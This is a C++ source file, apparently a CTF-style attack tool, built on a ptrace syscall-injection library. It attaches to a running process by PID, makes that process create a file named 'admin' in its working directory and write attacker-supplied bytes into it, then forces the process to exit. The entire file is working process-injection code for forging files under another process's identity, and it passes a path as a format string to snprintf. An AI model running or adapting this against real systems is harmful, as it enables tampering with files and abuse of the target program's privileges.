// Copyright 2019 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Author: Ian Eldred Pudney

#include <iostream>
#include <fstream>
#include <string>
#include <sys/ptrace.h>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fstream>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "ptrace_do.h"

using namespace std;

string dumpstream(istream& in) {
  std::istreambuf_iterator<char> begin(in);
  std::istreambuf_iterator<char> end;
  return string(begin, end);
}

string ProcessCwd(pid_t pid) {
  string buf;
  buf.resize(4096);
  int read_size = buf.size();
  while (read_size == buf.size()) {
    read_size = readlink((string("/proc/") + to_string(pid) + "/cwd").c_str(), &buf[0], buf.size());
    if (read_size < 0) {
      std::cerr << "Error reading /proc/self/exe: " << strerror(errno) << std::endl;
      exit(-1);
    }
  }
  buf.resize(read_size);
  return buf;
}

int main(int argc, char** argv) {
  pid_t pid = atoi(argv[1]);

  ptrace_do* target = ptrace_do_init(pid);
  if (!target) {
    std::cerr << "Failed to ptrace_do_init: " << strerror(errno) << std::endl;
    return -1;
  }

  string dest = ProcessCwd(pid) + "/admin";
  std::cout << "destination: " << dest << std::endl;

  char* buffer = (char *) ptrace_do_malloc(target, 256);
  memset(buffer, 0, 256);
  snprintf(buffer, 256, dest.c_str());
  auto ex_remote_addr = ptrace_do_push_mem(target, buffer);
  int ex_fd = ptrace_do_syscall(target, __NR_open, (uint64_t)ex_remote_addr, O_WRONLY | O_CREAT, 0, 0, 0, 0);
  std::cout << "ex_fd: " << ex_fd << std::endl;

  std::ifstream infile(argv[2]);
  if (!infile.is_open()) {
    std::cerr << "Failed to open " << argv[2] << std::endl;
  }

  string body = dumpstream(infile);
  std::cout << "Sending " << body.size() << " bytes to tracee." << std::endl;
  void* local_addr = ptrace_do_malloc(target, body.size());
  memcpy(local_addr, body.data(), body.size());
  ptrace_do_push_mem(target, local_addr);
  void* remote_addr = ptrace_do_get_remote_addr(target, local_addr);
  std::cout << "Remote addr for payload: " << remote_addr << std::endl;

  if (ex_fd < 0) {
    std::cerr << strerror(ex_fd) << std::endl;
    exit(1);
  }

  int writeret = ptrace_do_syscall(
      target, __NR_write,
      ex_fd, (uint64_t)remote_addr, body.size(),
      0, 0, 0);

  std::cout << "Wrote " << writeret << " bytes." << std::endl;
  if (writeret != body.size()) {
    std::cerr << "Failed to write all " << body.size() << " bytes." << std::endl;
    exit(1);
  }

  int sysret = ptrace_do_syscall(
      target, __NR_exit,
      0, 0, 0, 0, 0, 0);

  exit(0);

  ptrace_do_cleanup(target);
  return 0;
}
